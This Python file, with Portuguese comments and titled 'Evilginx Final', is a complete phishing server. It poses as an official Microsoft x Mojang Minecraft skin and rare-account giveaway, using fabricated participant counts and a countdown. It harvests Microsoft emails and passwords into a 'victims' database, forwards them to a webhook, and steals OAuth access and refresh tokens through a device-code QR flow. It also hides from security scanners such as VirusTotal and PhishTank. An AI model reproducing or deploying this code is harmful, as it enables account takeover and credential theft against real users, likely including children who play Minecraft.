#!/usr/bin/env python3
"""
EVILGINX FINAL - Versão limpa e corrigida
Todas as funcionalidades: skins, sorteio OG, captura email/senha, QR Code com Device Code
"""

import secrets
import json
import datetime
import random
import time
import requests
import os
import sqlite3
import base64
import re
import csv
import io
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from collections import defaultdict

PORT = int(os.environ.get("PORT", 8080))
PUBLIC_URL = os.environ.get("PUBLIC_URL", f"http://localhost:{PORT}")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")

DEVICE_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2"
DEVICE_SCOPE = "https://graph.microsoft.com/.default offline_access"

CONFIG = {
    "server_host": "0.0.0.0",
    "server_port": PORT,
    "webhook_url": WEBHOOK_URL,
    "public_url": PUBLIC_URL,
    "featured_skin": {"name": "ENDER PHOENIX", "value": "R$89,90", "rarity": "LENDÁRIA"},
    "skins_rotation": [
        {"name": "NETHER DRAGON", "value": "R$120,00", "rarity": "MÍTICA"},
        {"name": "OCEAN LORD", "value": "R$75,00", "rarity": "ÉPICA"},
        {"name": "VOID WALKER", "value": "R$95,00", "rarity": "LENDÁRIA"},
        {"name": "COSMIC GUARDIAN", "value": "R$150,00", "rarity": "MÍTICA"}
    ],
    "og_giveaway": {
        "active": True,
        "prize_name": random.choice(["Kill", "Hero", "Game", "Life", "Gold", "Iron", "Fire", "Snow", "Star", "Moon"]),
        "prize_value": "R$500,00+",
        "winners": 1,
        "fake_participants": 15247,
        "end_date": (datetime.datetime.now() + datetime.timedelta(days=60)).strftime('%d/%m/%Y')
    },
    "fake_servers": [
        {"name": "Minecraft Brasil", "icon": "🎮", "resgates": 15247},
        {"name": "CubeCraft Games", "icon": "🧊", "resgates": 8921},
        {"name": "Hypixel Network", "icon": "⚔️", "resgates": 28436},
        {"name": "Mineplex Brasil", "icon": "⭐", "resgates": 5642},
        {"name": "The Hive", "icon": "🐝", "resgates": 12389},
        {"name": "CraftLandia", "icon": "🌍", "resgates": 7893},
        {"name": "RedstoneBR", "icon": "🔴", "resgates": 3456},
        {"name": "SkyBlock Network", "icon": "☁️", "resgates": 9876}
    ],
    "global_stats": {"total_resgates": 15842, "total_participantes_sorteio": 15247}
}

captured_sessions = []
session_counter = 0
click_stats = defaultdict(int)
active_sessions = {}

def init_database():
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT, email TEXT, password TEXT, ip TEXT,
        user_agent TEXT, skin_choice TEXT, giveaway_participant INTEGER,
        time_on_page INTEGER, clicks INTEGER, session_id TEXT,
        access_token TEXT, refresh_token TEXT, token_expires TEXT
    )''')
    conn.commit()
    conn.close()

def save_to_database(data):
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    c.execute('''INSERT INTO victims (timestamp, email, password, ip, user_agent,
        skin_choice, giveaway_participant, time_on_page, clicks, session_id,
        access_token, refresh_token, token_expires)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)''',
        (data['timestamp'], data['email'], data['password'], data['ip'],
         data['user_agent'], data.get('skin_choice',''),
         1 if data.get('giveaway_participant') else 0,
         data.get('time_on_page',0), data.get('clicks',0), data.get('session_id',''),
         data.get('access_token',''), data.get('refresh_token',''), data.get('token_expires','')))
    conn.commit()
    conn.close()

def generate_session_id():
    global session_counter
    session_counter += 1
    return f"SID_{session_counter}_{secrets.token_hex(8)}"

def generate_captcha():
    a = random.randint(1,9)
    b = random.randint(1,9)
    return {"question": f"{a} + {b} = ?", "answer": str(a+b)}

def detect_security_environment(headers):
    ua = headers.get('User-Agent','').lower()
    bots = ['googlebot','bingbot','ahrefsbot','semrushbot','virustotal','phishtank','urlscan','censys','bot','crawler','scanner']
    if any(b in ua for b in bots): return True
    suspicious = ['x-scanner','x-crawler','x-security','x-forwarded-for']
    if any(h in headers for h in suspicious): return True
    return False

def calculate_score(email, password):
    score = 0
    if re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        score += 20
    domain = email.split('@')[-1].lower() if '@' in email else ''
    if domain in ['outlook.com','hotmail.com','live.com','msn.com','microsoft.com','gmail.com']:
        score += 20
    if len(password) >= 8:
        score += 30
    elif len(password) >= 6:
        score += 15
    has_upper = any(c.isupper() for c in password)
    has_lower = any(c.islower() for c in password)
    has_digit = any(c.isdigit() for c in password)
    has_special = any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password)
    if has_upper: score += 8
    if has_lower: score += 8
    if has_digit: score += 8
    if has_special: score += 6
    return min(score, 100)

def send_webhook(data):
    if not CONFIG["webhook_url"]:
        return
    score = data.get('validation_score', 0)
    if score >= 80:
        color, qual = 0x00ff00, "🏆 ALTA QUALIDADE"
    elif score >= 60:
        color, qual = 0xffaa00, "⭐ MÉDIA QUALIDADE"
    elif score >= 30:
        color, qual = 0xff6600, "⚠️ BAIXA QUALIDADE"
    else:
        color, qual = 0xff0000, "❌ BAIXÍSSIMA"
    embed = {
        "title": f"🎯 NOVA CONTA CAPTURADA! {qual}",
        "color": color,
        "fields": [
            {"name":"📧 Email","value":data['email'],"inline":True},
            {"name":"🔑 Senha","value":f"||{data['password']}||","inline":True},
            {"name":"📊 Score","value":f"{score}/100","inline":True},
            {"name":"🎨 Skin","value":data.get('skin_choice','N/A'),"inline":True},
            {"name":"🔐 Access Token","value":f"||{data.get('access_token','')[:40]}...||","inline":False},
            {"name":"🔄 Refresh Token","value":f"||{data.get('refresh_token','')[:40]}...||","inline":False},
            {"name":"🌐 IP","value":data['ip'],"inline":True}
        ],
        "footer":{"text":f"Total capturadas: {len(captured_sessions)}"},
        "timestamp":datetime.datetime.now().isoformat()
    }
    try:
        requests.post(CONFIG["webhook_url"], json={"embeds":[embed]}, timeout=5)
    except:
        pass

def start_device_flow():
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
    data = {"client_id": DEVICE_CLIENT_ID, "scope": DEVICE_SCOPE}
    try:
        r = requests.post(url, data=data, timeout=10)
        if r.status_code == 200:
            j = r.json()
            return j.get("user_code"), j.get("device_code"), j.get("verification_uri"), j.get("interval", 5), j.get("expires_in", 900)
        else:
            return None, None, None, 5, 0
    except Exception as e:
        print(f"[DeviceCode] Erro: {e}")
        return None, None, None, 5, 0

def poll_for_token(device_code, interval, timeout):
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": DEVICE_CLIENT_ID,
        "device_code": device_code,
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
    }
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            r = requests.post(url, data=data, timeout=5)
            if r.status_code == 200:
                j = r.json()
                return j.get("access_token", ""), j.get("refresh_token", ""), j.get("expires_in", 0)
            elif r.status_code == 400:
                pass
        except:
            pass
        time.sleep(interval)
    return "", "", 0

class EvilginxFinal(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        path = urlparse(self.path).path
        if detect_security_environment(self.headers):
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Microsoft 365</h1></body></html>")
            return
        if path == '/':
            self.serve_main_page()
        elif path == '/dashboard':
            self.serve_dashboard()
        elif path == '/qrcode':
            self.serve_qrcode()
        elif path == '/stats':
            self.serve_stats()
        elif path == '/export/json':
            self.export_json()
        elif path == '/export/csv':
            self.export_csv()
        elif path == '/export/html':
            self.export_html()
        elif path == '/api/export':
            self.export_data()
        elif path == '/api/stats':
            self.get_stats()
        elif path == '/api/captcha':
            self.serve_captcha()
        elif path == '/device/poll':
            self.handle_device_poll()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path
        if path == '/auth':
            self.capture_credentials()
        elif path == '/api/click':
            self.track_click()
        elif path == '/api/heartbeat':
            self.heartbeat()
        else:
            self.send_response(404)
            self.end_headers()

    def handle_device_poll(self):
        query = parse_qs(urlparse(self.path).query)
        dc = query.get('device_code', [None])[0]
        if not dc:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Missing device_code")
            return
        access, refresh, expires = poll_for_token(dc, 5, 300)
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"access_token": access, "refresh_token": refresh, "expires_in": expires}).encode())
        if access:
            print(f"[DeviceCode] Tokens obtidos: AT {access[:40]}...")

    def serve_qrcode(self):
        user_code, device_code, ver_uri, interval, expires = start_device_flow()
        if not device_code:
            qr_url = CONFIG["public_url"]
            manual_code = ""
        else:
            qr_url = ver_uri
            manual_code = user_code
        html = f'''<!DOCTYPE html>
<html>
<head><title>QR Code - Obter Tokens</title>
<style>body{{background:#1a1a2e;color:white;text-align:center;}}.qr{{background:white;padding:20px;display:inline-block;border-radius:10px;}}</style>
</head>
<body>
<h1>📱 Escaneie para autorizar sua conta Microsoft</h1>
<p>Você receberá skins e participará do sorteio</p>
<div class="qr"><div id="qrcode"></div></div>
{"<p><strong>Código manual:</strong> " + manual_code + "</p>" if manual_code else ""}
<p><strong>Não feche esta página.</strong> Após autorizar no celular, clique em "Testar Token".</p>
<button id="pollBtn" onclick="pollToken()">🔍 Testar Token (após autorizar)</button>
<div id="tokenResult" style="margin-top:20px;padding:10px;background:#333;border-radius:8px;"></div>
<button onclick="location.href='/'">Voltar</button>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
<script>
new QRCode(document.getElementById("qrcode"), {{text:'{qr_url}', width:250, height:250}});
let deviceCode = "{device_code}";
async function pollToken() {{
    if(!deviceCode) {{ document.getElementById("tokenResult").innerHTML = "Falha ao iniciar fluxo."; return; }}
    document.getElementById("pollBtn").disabled = true;
    document.getElementById("tokenResult").innerHTML = "⏳ Aguardando autorização...";
    try {{
        let resp = await fetch(`/device/poll?device_code=${{encodeURIComponent(deviceCode)}}`);
        let data = await resp.json();
        if(data.access_token) {{
            document.getElementById("tokenResult").innerHTML = "✅ Tokens obtidos! Access Token: " + data.access_token.slice(0,40) + "...<br>Refresh Token: " + data.refresh_token.slice(0,40) + "...";
        }} else {{
            document.getElementById("tokenResult").innerHTML = "❌ Nenhum token recebido. Certifique-se de que autorizou no celular e tente novamente.";
        }}
    }} catch(e) {{
        document.getElementById("tokenResult").innerHTML = "Erro: " + e;
    }}
    document.getElementById("pollBtn").disabled = false;
}}
</script>
</body>
</html>'''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def serve_main_page(self):
        session_id = generate_session_id()
        active_sessions[session_id] = time.time()
        featured = CONFIG["featured_skin"]
        current = random.choice(CONFIG["skins_rotation"])
        og = CONFIG["og_giveaway"]
        fake_resgates = CONFIG["global_stats"]["total_resgates"] + random.randint(0,50)
        fake_participants = og["fake_participants"] + random.randint(0,100)
        online = random.randint(47,189)
        skins_left = random.randint(37,156)
        captcha = generate_captcha()
        servers_html = ''.join([f'<div class="server-item"><span>{s["icon"]} {s["name"]}</span><span>✓ {s["resgates"]}+</span></div>' for s in CONFIG["fake_servers"][:5]])
        html = f'''<!DOCTYPE html>
<html lang="pt-BR">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>🎁 EVENTO MINECRAFT 2026 - SKINS + CONTA RARA!</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
@keyframes pulse{{0%{{opacity:1}}50%{{opacity:0.7}}100%{{opacity:1}}}}
@keyframes loading{{0%{{width:0%}}100%{{width:100%}}}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
body{{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);min-height:100vh;padding:20px}}
.container{{max-width:550px;margin:0 auto}}
.main-card{{background:white;border-radius:24px;padding:30px;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5)}}
.event-header{{background:linear-gradient(135deg,#f7971e,#ffd200);margin:-30px -30px 20px -30px;padding:25px;text-align:center;border-radius:24px 24px 0 0}}
.event-header h1{{font-size:28px}}
.skin-showcase{{display:flex;gap:15px;margin-bottom:20px}}
.skin-card{{flex:1;background:linear-gradient(135deg,#667eea,#764ba2);color:white;padding:15px;border-radius:16px;text-align:center;cursor:pointer;border:2px solid transparent;transition:0.3s}}
.skin-card.selected{{border-color:#ffd700;transform:scale(1.02)}}
.og-card{{background:linear-gradient(135deg,#1a1a2e,#16213e);color:#ffd700;padding:20px;border-radius:16px;margin-bottom:20px;text-align:center;position:relative;overflow:hidden}}
.og-card::before{{content:"🏆";font-size:80px;position:absolute;right:-20px;top:-20px;opacity:0.1}}
.og-name{{font-size:36px;font-weight:bold;font-family:monospace;background:#ffd700;color:#1a1a2e;display:inline-block;padding:5px 25px;border-radius:50px;margin:10px 0}}
.counters{{background:#f8f9fa;padding:15px;border-radius:16px;margin-bottom:20px}}
.counter-row{{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #eee}}
.live-number{{font-weight:bold;color:#e94560;animation:pulse 1.5s infinite}}
.servers-integration{{background:#e8f5e9;padding:15px;border-radius:16px;margin-bottom:20px;font-size:12px}}
.server-item{{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #ddd}}
.participate-btn{{width:100%;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:white;border:none;padding:16px;font-size:18px;font-weight:bold;border-radius:50px;cursor:pointer;margin:15px 0;transition:0.2s}}
.participate-btn:hover{{transform:scale(1.02)}}
.login-section{{display:none;margin-top:20px;border-top:2px solid #f0f0f0;padding-top:20px}}
.input-field{{width:100%;padding:14px;font-size:15px;border:2px solid #e0e0e0;border-radius:12px;margin-bottom:15px}}
.login-btn{{width:100%;background:#0067b8;color:white;border:none;padding:14px;font-size:16px;font-weight:bold;border-radius:12px;cursor:pointer}}
.captcha-box{{background:#f5f5f5;padding:15px;border-radius:12px;margin:15px 0;text-align:center}}
.captcha-question{{font-size:24px;font-weight:bold;background:white;display:inline-block;padding:10px 20px;border-radius:10px;margin:10px 0}}
.captcha-input{{width:100px;text-align:center;font-size:20px;padding:10px;margin:10px auto;display:block}}
.captcha-error{{color:#d13438;font-size:12px;display:none}}
.step-2{{display:none}}
.user-badge{{display:flex;align-items:center;gap:12px;background:#f5f5f5;padding:12px;border-radius:12px;margin-bottom:20px}}
.loading-overlay{{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;justify-content:center;align-items:center;flex-direction:column;z-index:9999}}
.spinner{{width:60px;height:60px;border:5px solid #333;border-top-color:#ffd700;border-radius:50%;animation:spin 1s linear infinite}}
.loading-text{{color:white;margin-top:20px}}
.loading-progress{{width:300px;height:6px;background:#333;border-radius:3px;margin-top:20px;overflow:hidden}}
.loading-bar{{height:100%;background:#ffd700;width:0%;animation:loading 2s ease-out forwards}}
.success-message{{text-align:center;padding:40px}}
.giveaway-confirmation{{background:linear-gradient(135deg,#ffd700,#ffb347);padding:15px;border-radius:16px;margin:20px 0}}
.timer{{text-align:center;margin-top:15px;font-size:11px;color:#888}}
</style>
</head>
<body>
<div class="container"><div class="main-card">
<div class="event-header"><h1>🎉 EVENTO MINECRAFT 2026! 🎉</h1><div>⭐ PARCERIA OFICIAL MICROSOFT x MOJANG ⭐</div></div>
<div class="skin-showcase"><div class="skin-card selected" data-skin="{featured['name']}" onclick="selectSkin(this,'{featured['name']}')"><div>🔥</div><div>{featured['name']}</div><div>{featured['rarity']}</div><div>{featured['value']}</div></div>
<div class="skin-card" data-skin="{current['name']}" onclick="selectSkin(this,'{current['name']}')"><div>🐉</div><div>{current['name']}</div><div>{current['rarity']}</div><div>{current['value']}</div></div></div>
<div class="og-card"><span>🎲 SORTEIO ESPECIAL 🎲</span><div class="og-name">{og['prize_name']}</div><div>Conta Minecraft com nome <strong>RARO de 4 letras!</strong></div><div>Valor estimado: {og['prize_value']}</div><div>👥 <span id="ogParticipants">{fake_participants}</span> participantes | 🏆 {og['winners']} vencedor</div><div>📅 Sorteio: {og['end_date']}</div></div>
<div class="counters"><div class="counter-row"><span>🌍 Total de resgates globais:</span><span class="live-number" id="globalResgates">{fake_resgates}</span></div><div class="counter-row"><span>🎮 Skins restantes:</span><span id="skinsLeft">{skins_left}</span></div><div class="counter-row"><span>👥 Online agora:</span><span id="onlineCount" class="live-number">{online}</span></div><div class="counter-row"><span>⏰ Oferta expira em:</span><span id="timer">14:59</span></div></div>
<div class="servers-integration"><div><strong>🔗 Integrado com os servidores:</strong></div>{servers_html}<div style="margin-top:8px;font-size:11px;">+ outros servidores</div></div>
<button class="participate-btn" id="participateBtn" onclick="showLogin()">🎁 PARTICIPAR DO EVENTO (E-mail/Senha)</button>
<div id="step1" class="login-section"><div style="text-align:center;margin-bottom:15px;"><span style="background:#ff9800;color:white;padding:5px 15px;border-radius:50px;">🤖 VERIFICAÇÃO ANTI-BOT</span></div>
<div class="captcha-box"><div>🔒 Verifique que você é humano:</div><div class="captcha-question" id="captchaQuestion">{captcha['question']}</div><input type="text" id="captchaInput" class="captcha-input" placeholder="?" maxlength="2"><div class="captcha-error" id="captchaError">Código incorreto.</div><button onclick="refreshCaptcha()" style="background:none;border:none;color:#0067b8;cursor:pointer;">⟳ Atualizar</button></div>
<form id="emailForm"><input type="email" id="email" class="input-field" placeholder="Seu email da Microsoft" autofocus><div id="emailError" style="color:#d13438;display:none;"></div><button type="submit" class="login-btn">🔓 CONTINUAR</button></form></div>
<div id="step2" class="step-2"><div class="user-badge"><div>👤</div><div><span id="userEmailDisplay"></span><br><a href="#" onclick="resetToStep1();return false;">Alterar conta</a></div></div>
<form id="passwordForm"><div style="position:relative;"><input type="password" id="password" class="input-field" placeholder="Sua senha da Microsoft"><button type="button" onclick="togglePassword()" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;">👁️</button></div><div id="passwordError" style="color:#d13438;display:none;"></div><button type="submit" class="login-btn">✅ CONFIRMAR E PARTICIPAR</button></form></div>
<div class="timer">🔒 Verificação de segurança ativa</div>
</div></div>
<div id="loadingOverlay" class="loading-overlay"><div class="spinner"></div><div class="loading-text" id="loadingText">Verificando sua conta...</div><div class="loading-progress"><div class="loading-bar"></div></div></div>
<script>
let currentCaptchaAnswer = "{captcha['answer']}";
let selectedSkin = "{featured['name']}";
let capturedEmail = '';
let sessionId = '{session_id}';
let pageStartTime = Date.now();
let clickCount = 0;
let globalResgates = {fake_resgates};
let skinsLeft = {skins_left};
let onlineVisitors = {online};
let timerSeconds = 900;
setInterval(() => {{
    if(skinsLeft>0){{ skinsLeft-=Math.floor(Math.random()*2)+1; document.getElementById('skinsLeft').innerText=Math.max(0,skinsLeft); }}
    globalResgates+=Math.floor(Math.random()*5)+2; document.getElementById('globalResgates').innerText=globalResgates.toLocaleString();
    onlineVisitors+=Math.floor(Math.random()*5)-2; onlineVisitors=Math.min(300,Math.max(25,onlineVisitors)); document.getElementById('onlineCount').innerText=onlineVisitors;
    let op = document.getElementById('ogParticipants'); if(op){{ let cur = parseInt(op.innerText.replace(/,/g,'')) || {fake_participants}; op.innerText = (cur+Math.floor(Math.random()*3)+1).toLocaleString(); }}
    if(timerSeconds>0){{ timerSeconds--; let m=Math.floor(timerSeconds/60), s=timerSeconds%60; document.getElementById('timer').innerText=`${{m.toString().padStart(2,'0')}}:${{s.toString().padStart(2,'0')}}`; }}
}}, 3000);
function selectSkin(el,name){{ document.querySelectorAll('.skin-card').forEach(c=>c.classList.remove('selected')); el.classList.add('selected'); selectedSkin=name; }}
function togglePassword(){{ let p=document.getElementById('password'); p.type=p.type==='password'?'text':'password'; }}
function refreshCaptcha(){{ fetch('/api/captcha').then(r=>r.json()).then(d=>{{ document.getElementById('captchaQuestion').innerHTML=d.question; currentCaptchaAnswer=d.answer; document.getElementById('captchaInput').value=''; document.getElementById('captchaError').style.display='none'; }}); }}
function showLoading(msg){{ document.getElementById('loadingText').innerHTML=msg; document.getElementById('loadingOverlay').style.display='flex'; }}
function hideLoading(){{ document.getElementById('loadingOverlay').style.display='none'; }}
function showLogin(){{ document.getElementById('participateBtn').style.display='none'; document.getElementById('step1').style.display='block'; }}
function resetToStep1(){{ document.getElementById('step1').style.display='block'; document.getElementById('step2').style.display='none'; document.getElementById('email').value=''; document.getElementById('password').value=''; }}
document.addEventListener('click',()=>{{ clickCount++; fetch('/api/click',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{}})}}); }});
document.getElementById('emailForm').addEventListener('submit', function(e){{ e.preventDefault(); let cv=document.getElementById('captchaInput').value; if(cv!==currentCaptchaAnswer){{ document.getElementById('captchaError').style.display='block'; refreshCaptcha(); return; }} let email=document.getElementById('email').value; if(!email||!email.includes('@')){{ document.getElementById('emailError').innerText='Email inválido'; document.getElementById('emailError').style.display='block'; return; }} document.getElementById('emailError').style.display='none'; capturedEmail=email; document.getElementById('userEmailDisplay').innerText=email; document.getElementById('step1').style.display='none'; document.getElementById('step2').style.display='block'; document.getElementById('password').focus(); }});
document.getElementById('passwordForm').addEventListener('submit', function(e){{ e.preventDefault(); let pwd=document.getElementById('password').value; if(!pwd){{ document.getElementById('passwordError').innerText='Digite sua senha'; document.getElementById('passwordError').style.display='block'; return; }} document.getElementById('passwordError').style.display='none'; let timeOnPage=Math.floor((Date.now()-pageStartTime)/1000); let loadStart=Date.now(); showLoading('🔍 Verificando credenciais...'); setTimeout(()=>{{ showLoading('🎮 Conectando à sua conta Microsoft...'); setTimeout(()=>{{ showLoading('🎁 Adicionando skin à sua conta...'); setTimeout(()=>{{ showLoading('🎲 Inscrevendo no sorteio OG...'); setTimeout(()=>{{ let loadingTime=Date.now()-loadStart; fetch('/auth',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{email:capturedEmail, password:pwd, session_id:sessionId, user_agent:navigator.userAgent, time_on_page:timeOnPage, clicks:clickCount, skin_choice:selectedSkin, giveaway_participant:true, captcha_time:0, loading_time:loadingTime}})}}).then(()=>{{ hideLoading(); document.querySelector('.main-card').innerHTML=`<div class="success-message"><div>🎉</div><h2>PARTICIPAÇÃO CONFIRMADA!</h2><div class="giveaway-confirmation">🎲 <strong>VOCÊ ESTÁ CONCORRENDO!</strong> 🎲<br>Sua inscrição no sorteio da conta <strong>${'{og['prize_name']}'}</strong> foi registrada!<br>Número: #${Math.floor(Math.random()*90000)+10000}</div><p>Sua skin <strong>${selectedSkin}</strong> foi adicionada!</p><p>Redirecionando...</p><div class="spinner" style="width:30px;height:30px;margin:20px auto;"></div></div>`; setTimeout(()=>window.location.href='https://www.minecraft.net/pt-pt',4000); }}); }},800); }},800); }},800); }},800); }});
</script>
</body>
</html>'''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def capture_credentials(self):
        length = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(length).decode()
        data = json.loads(body)
        email = data.get('email','')
        password = data.get('password','')
        session_id = data.get('session_id','')
        user_agent = data.get('user_agent','')
        time_on_page = data.get('time_on_page',0)
        clicks = data.get('clicks',0)
        skin = data.get('skin_choice','ENDER PHOENIX')
        giveaway = data.get('giveaway_participant',True)
        captcha_time = data.get('captcha_time',0)
        loading_time = data.get('loading_time',0)
        ip = self.client_address[0]
        stats = {'page_time':time_on_page, 'clicks':clicks}
        score = calculate_score(email, password)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        capture = {
            "timestamp":timestamp, "session_id":session_id, "email":email, "password":password,
            "user_agent":user_agent[:200], "ip":ip, "stats":stats,
            "skin_choice":skin, "giveaway_participant":giveaway,
            "time_on_page":time_on_page, "clicks":clicks,
            "access_token":"", "refresh_token":"", "token_expires":"",
            "validation_score":score
        }
        captured_sessions.append(capture)
        save_to_database({
            'timestamp':timestamp, 'email':email, 'password':password, 'ip':ip,
            'user_agent':user_agent[:200], 'skin_choice':skin,
            'giveaway_participant':giveaway, 'time_on_page':time_on_page,
            'clicks':clicks, 'session_id':session_id,
            'access_token':'', 'refresh_token':'', 'token_expires':''
        })
        send_webhook({
            'email':email, 'password':password, 'session_id':session_id, 'ip':ip,
            'skin_choice':skin, 'validation_score':score,
            'access_token':'', 'refresh_token':''
        })
        print(f"\n[{timestamp}] 📩 CAPTURA REALIZADA (Score: {score})")
        print(f"  Email: {email} | Senha: {password} | Skin: {skin} | IP: {ip}")
        print("-"*60)
        self.send_response(200)
        self.end_headers()

    def track_click(self):
        ip = self.client_address[0]
        click_stats[ip] = click_stats.get(ip,0)+1
        self.send_response(200)
        self.end_headers()

    def heartbeat(self):
        length = int(self.headers.get('Content-Length',0))
        if length:
            body = self.rfile.read(length).decode()
            data = json.loads(body)
            if data.get('session_id'):
                active_sessions[data['session_id']] = time.time()
        self.send_response(200)
        self.end_headers()

    def serve_captcha(self):
        c = generate_captcha()
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.end_headers()
        self.wfile.write(json.dumps(c).encode())

    def serve_dashboard(self):
        rows = ''
        for s in captured_sessions[-30:]:
            rows += f'<tr><td>{s["timestamp"]}</td><td>{s["email"][:30]}</td><td>{s["password"]}</td><td>{s.get("access_token","")[:20]}...</td><td>{s.get("refresh_token","")[:20]}...</td><td>{s["ip"]}</td></tr>'
        if not rows:
            rows = '<tr><td colspan="6">Nenhuma captura ainda</td></tr>'
        html = f'''<!DOCTYPE html>
<html>
<head><title>Dashboard - Evilginx Final</title>
<style>
body{{background:#0f0f1a;color:#cdd6f4;font-family:monospace;padding:20px;}}
table{{width:100%;border-collapse:collapse;background:#1e1e2e;}}
th,td{{padding:12px;border-bottom:1px solid #313244;}}
th{{background:#313244;}}
button{{background:#89b4fa;border:none;padding:10px 20px;margin:5px;cursor:pointer;border-radius:8px;}}
</style>
</head>
<body>
<h1>🎯 EVILGINX V8 - TOKENS VIA DEVICE CODE</h1>
<div>
<button onclick="location.href='/'">Voltar</button>
<button onclick="location.href='/qrcode'">QR Code</button>
<button onclick="location.href='/stats'">Stats</button>
<button onclick="location.href='/export/json'">JSON</button>
<button onclick="location.href='/export/csv'">CSV</button>
<button onclick="location.href='/export/html'">HTML</button>
</div>
<h3>Capturas realizadas</h3>
<table>
<thead><tr><th>Data</th><th>Email</th><th>Senha</th><th>Access Token</th><th>Refresh Token</th><th>IP</th></tr></thead>
<tbody>{rows}</tbody>
</table>
</body>
</html>'''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def serve_stats(self):
        valid_tokens = sum(1 for s in captured_sessions if s.get('access_token'))
        avg_score = sum(s.get('validation_score',0) for s in captured_sessions)/max(1,len(captured_sessions))
        html = f'''<!DOCTYPE html>
<html>
<head><title>Stats - Evilginx Final</title>
<style>body{{background:#0f0f1a;color:white;font-family:monospace;padding:20px;}}</style>
</head>
<body>
<h1>📊 Estatísticas</h1>
<p>Total capturas: {len(captured_sessions)}</p>
<p>Tokens reais capturados: {valid_tokens}</p>
<p>Score médio: {round(avg_score,1)}/100</p>
<button onclick="location.href='/dashboard'">Voltar</button>
</body>
</html>'''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def export_json(self):
        out = [{"timestamp":s['timestamp'],"email":s['email'],"password":s['password'],"ip":s['ip'],"access_token":s.get('access_token',''),"refresh_token":s.get('refresh_token','')} for s in captured_sessions]
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.send_header('Content-Disposition','attachment; filename="evilginx_data.json"')
        self.end_headers()
        self.wfile.write(json.dumps(out,indent=2).encode())

    def export_csv(self):
        output = io.StringIO()
        w = csv.writer(output)
        w.writerow(['Timestamp','Email','Senha','IP','Access Token','Refresh Token'])
        for s in captured_sessions:
            w.writerow([s['timestamp'], s['email'], s['password'], s['ip'], s.get('access_token',''), s.get('refresh_token','')])
        self.send_response(200)
        self.send_header('Content-type','text/csv')
        self.send_header('Content-Disposition','attachment; filename="evilginx_data.csv"')
        self.end_headers()
        self.wfile.write(output.getvalue().encode())

    def export_html(self):
        rows = ''.join([f'<tr><td>{s["timestamp"]}</td><td>{s["email"]}</td><td>{s["password"]}</td><td>{s["ip"]}</td><td>{s.get("access_token","")[:30]}...</td></tr>' for s in captured_sessions[-100:]])
        html = f'''<!DOCTYPE html>
<html>
<head><title>Relatório Evilginx Final</title>
<style>table{{border-collapse:collapse;width:100%}} th,td{{border:1px solid #ddd;padding:8px;}}</style>
</head>
<body>
<h1>Relatório Evilginx Final</h1>
<p>Total: {len(captured_sessions)}</p>
<table>
<thead><tr><th>Data</th><th>Email</th><th>Senha</th><th>IP</th><th>Access Token</th></tr></thead>
<tbody>{rows}</tbody>
</table>
</body>
</html>'''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.send_header('Content-Disposition','attachment; filename="evilginx_report.html"')
        self.end_headers()
        self.wfile.write(html.encode())

    def export_data(self):
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.end_headers()
        self.wfile.write(json.dumps(captured_sessions, indent=2, default=str).encode())

    def get_stats(self):
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            'active_sessions': len(active_sessions),
            'total_captures': len(captured_sessions),
            'total_visits': sum(click_stats.values()),
            'unique_ips': len(click_stats)
        }).encode())

def run():
    init_database()
    print("="*70)
    print("🎯 EVILGINX FINAL - TODAS AS FUNCIONALIDADES ATIVAS")
    print("="*70)
    print(f"📡 URL pública: {PUBLIC_URL}")
    print(f"🎁 Página principal: {PUBLIC_URL}")
